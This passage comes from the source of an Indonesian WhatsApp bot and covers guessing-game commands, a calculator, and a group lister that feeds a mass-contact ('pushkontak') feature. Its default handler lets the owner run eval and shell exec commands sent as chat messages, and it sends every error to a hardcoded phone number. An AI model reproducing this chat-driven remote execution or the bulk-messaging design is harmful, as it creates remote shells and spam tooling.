                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
                        delete tebaktebakan[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'bendera') {
                    if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
                    }, {
                        quoted: m
                    }).then(() => {
                        tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.name)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
                        delete tebakbendera[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'bendera2') {
                    if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
                    }, {
                        quoted: m
                    }).then(() => {
                        tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.name)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m)
                        delete tebakbendera2[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kabupaten') {
                    if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
                        tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.title)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
                        delete tebakkabupaten[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kimia') {
                    if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
                        tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.lambang)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m)
                        delete tebakkimia[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'asahotak') {
                    if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m)
                        delete tebakasahotak[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'siapakahaku') {
                    if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebaksiapakahaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksiapakahaku[m.sender.split('@')[0]]}`, m)
                        delete tebaksiapakahaku[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'susunkata') {
                    if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : 60s`, m).then(() => {
                        tebaksusunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksusunkata[m.sender.split('@')[0]]}`, m)
                        delete tebaksusunkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'tekateki') {
                    if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebaktekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktekateki[m.sender.split('@')[0]]}`, m)
                        delete tebaktekateki[m.sender.split('@')[0]]
                    }
                }
            }
            break
case "kalkulator":
 if (!text) return reply(`Lah Mana`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
  let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
  try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
  } catch (e) {
if (e == undefined) throw 'Isinya?'
throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
  break
  case "cekidgc": {
if (!isOwner) return reply(mess.owner)
let getGroups = await kontolditzz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await kontolditzz.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
default:

if (budy.startsWith('<')) {
if (!isOwner) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
        
if (budy.startsWith('vv')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}
}
} catch (err) {
console.log(util.format(err))
let e = String(err)
kontolditzz.sendMessage("62856589391171@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
